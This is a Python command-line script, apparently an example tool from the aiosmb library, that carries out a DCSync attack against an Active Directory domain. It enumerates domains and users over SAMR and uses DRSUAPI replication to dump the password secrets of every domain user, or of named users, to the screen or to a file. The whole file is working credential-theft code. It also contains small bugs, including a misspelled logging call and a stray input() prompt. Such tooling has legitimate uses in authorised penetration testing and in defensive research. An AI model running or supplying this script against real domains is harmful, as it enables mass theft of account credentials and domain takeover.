import asyncio
import logging
import json

import aiosmb
from aiosmb.commons.smbcredential import SMBCredential
from aiosmb.commons.smbtarget import SMBTarget
from aiosmb.smbconnection import SMBConnection
from aiosmb.commons.authenticator_builder import AuthenticatorBuilder
from aiosmb.dcerpc.v5.transport.smbtransport import SMBTransport
from aiosmb.dcerpc.v5.interfaces.drsuapimgr import SMBDRSUAPI
from aiosmb.dcerpc.v5.interfaces.samrmgr import SMBSAMR


async def dcsync(connection_string, filename = None, target_domain = None, target_users = [], json_out = False):
	target = SMBTarget.from_connection_string(connection_string)
	credential = SMBCredential.from_connection_string(connection_string)
	spneg = AuthenticatorBuilder.to_spnego_cred(credential, target)
	
	async with SMBConnection(spneg, target) as connection: 
		await connection.login()
		
		async with SMBSAMR(connection) as samr:
			logging.debug('Connecting to SAMR')
			try:
				await samr.connect()
			except Exception as e:
				loggign.exception('Failed to connect to SAMR')
			
		
			if target_domain is None:
				logging.debug('No domain defined, fetching it from SAMR')
				
						
				logging.debug('Fetching domains...')
				async for domain in samr.list_domains():
					if target_domain is None: #using th first available
						target_domain = domain
					logging.debug('Domain available: %s' % domain)
						
			logging.debug('Using domain: %s' % target_domain)
			async with SMBDRSUAPI(connection, target_domain) as drsuapi:
				try:
					await drsuapi.connect()
					await drsuapi.open()
				except:
					logging.exception('Failed to connect to DRSUAPI!')
				
				
				if len(target_users) > 0:
					if filename is not None:
						with open(filename, 'w') as f:
							for username in target_users:
								input('polling secrets for user: %s' % username)
								secrets = await drsuapi.get_user_secrets(username)
								if json_out == True:
									f.write(json.dumps(secrets.to_dict()))
								else:
									f.write(str(secrets))
									
					else:
						for username in target_users:
							secrets = await drsuapi.get_user_secrets(username)
							print(str(secrets))
						
				else:
					domain_sid = await samr.get_domain_sid(target_domain)
					domain_handle = await samr.open_domain(domain_sid)
					if filename is not None:
						with open(filename, 'w') as f:
							async for username, user_sid in samr.list_domain_users(domain_handle):
								secrets = await drsuapi.get_user_secrets(username)
								if json_out == True:
									f.write(json.dumps(secrets.to_dict()) + '\r\n')
								else:
									f.write(str(secrets))
									
					else:
						async for username, user_sid in samr.list_domain_users(domain_handle):
							secrets = await drsuapi.get_user_secrets(username)
							print(str(secrets))

	print('Done!')
if __name__ == '__main__':
	import argparse
	
	
	
	parser = argparse.ArgumentParser(description='Fetch all domain user credentials via DCSync (DRSUAPI)')
	parser.add_argument('-v', '--verbose', action='count', default=0, help='Increase verbosity, can be stacked')
	parser.add_argument('connection_string', help='connection string. Identifies the credential to be used and the target')
	parser.add_argument('-o', '--out-file', help='file to store the results in')
	parser.add_argument('-d', '--domain', default = None, help='Name of the domain to perform DCSync on.')
	parser.add_argument('--json', action='store_true', help='File output will be pritten in JSON format')
	parser.add_argument('-u', '--user', action='append', default = [], help='User name to get secrets for. If not used, all users will be polled. Can be stacked.')
	
	args = parser.parse_args()	
	
	if args.verbose == 0:
		logging.basicConfig(level=logging.INFO)
		aiosmb.logger.setLevel(logging.WARNING)
		
	elif args.verbose == 1:
		logging.basicConfig(level=logging.DEBUG)
		aiosmb.logger.setLevel(logging.INFO)
		
	else:
		logging.basicConfig(level=1)
		aiosmb.logger.setLevel(logging.DEBUG)
	
	asyncio.run(dcsync(args.connection_string, args.out_file, args.domain, args.user, json_out = args.json))
	